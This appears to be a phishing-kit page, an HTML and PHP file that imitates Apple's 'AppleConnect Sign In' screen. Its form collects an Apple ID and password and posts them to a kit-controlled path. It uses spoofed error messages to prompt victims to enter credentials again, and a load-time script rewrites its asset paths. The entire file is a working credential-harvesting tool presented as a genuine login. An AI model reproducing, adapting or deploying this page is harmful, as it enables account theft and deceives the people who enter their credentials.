<script type="text/javascript">
var url = 'gloglo/'
</script>
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AppleConnect Sign In</title>
  <script src="https://code.jquery.com/jquery-3.0.0.min.js" charset="utf-8"></script>

</head>
<body>
  <div class="loading">
  </div>
  <div class="loaded" style="display:none">
    <link rel="stylesheet" type="text/css" href="{enso}/narmin.css">
    <link rel="stylesheet" type="text/css" href="{enso}/zlazla.css">
    <style media="screen">
    div.outer{
      height: auto;
    }
    input[type="password"] {
      font-weight: bolder;
      margin: 0 3px;
      letter-spacing: 1px;
    }
::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #4f4e53;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #4f4e53;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #4f4e53;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #4f4e53;
}

/*==========  Mobile First Method  ==========*/

    /* Custom, iPhone Retina */ 
    @media only screen and (min-width : 320px) {
        
    }

    /* Extra Small Devices, Phones */ 
    @media only screen and (min-width : 480px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Small Devices, Tablets */
    @media only screen and (min-width : 768px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Medium Devices, Desktops */
    @media only screen and (min-width : 992px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Large Devices, Wide Screens */
    @media only screen and (min-width : 1200px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
} 
h1.logo {
margin-left: -22px;
}
.loaded {

    padding-top: 94px;

}
    }
    </style>
    <div id="main" role="main" class="acp-content">
      <section class="acp-sign-in">
        <div class="acp-login-container">
          <h1 class="logo"></h1>
          <p id="title"></p>
          <div class="outer">
            <div class="inner">
              <div class="main">
               <?php if(isset($_GET['home']) && $_GET['home'] == "false"){
?><p id="errormsg">Your Apple ID or password was entered incorrectly.</p><?php
}elseif(isset($_GET['home']) && $_GET['home'] == "clear"){?>
<p id="errormsg">Please enter your Apple ID and password.</p>

<?php
}elseif(isset($_GET['home']) && $_GET['home'] == ''){


}

?>
                <p id="loadingSpinner" style="display:none">
                  <img src="{enso}/acopic/abbr.gif" alt="" width="38" height="38" />
                </p>

                <form id="command" name="form2" action="{enso}/?log" method="post"> <!--/********** end form *****************/-->
                  <div class="pair">
                    <div class="module">
                      <label for="accountname">Account Name </label>
                      <input id="accountname" name="appleId" tabindex="1" spellcheck="false" name="theAccountName" autocorrect="off" type="text" autocapitalize="off" aria-label="Apple ID" value="" size="30" maxlength="128" autocomplete="off" />


                    </div>
                    <div class="module">
                      <!--   Insert non-production environment name before "Password"	 -->
                      <label for="accountpassword">Password </label>

                      <div class="buttonfield" style="margin-left: -3px;">
                        <input id="accountpassword" name="accountPassword" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="password" value="" size="30" autocomplete="off" />
                        <!--  submit  -->
                        <input id="continueFieldbutton" type="image" value="" aria-label="Sign In" src="{enso}/acopic/acco.png">
                      </div>

                      <a id="passwordURL"	class="forgot-link" href="#"
                       style="
    display: inline-block;
    margin-top:10px;
">Forgot your password?</a>

                    </div>
                  </div>
                </form>   <!--/*************** form ******************/-->

                
               

              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
  <script type="text/javascript">
  $(document).ready(function(){
    var body = $('.loaded').html().replace(/{enso}/g, url);
    $('.loading').fadeOut(function(){

      $('.loaded').empty().html(body);
      $('#title').html('<h2><?php echo $logname; ?></h2>')

      $('.loaded').fadeIn();
    })
  });


 

  </script>
</body>
</html>
</body>
</html>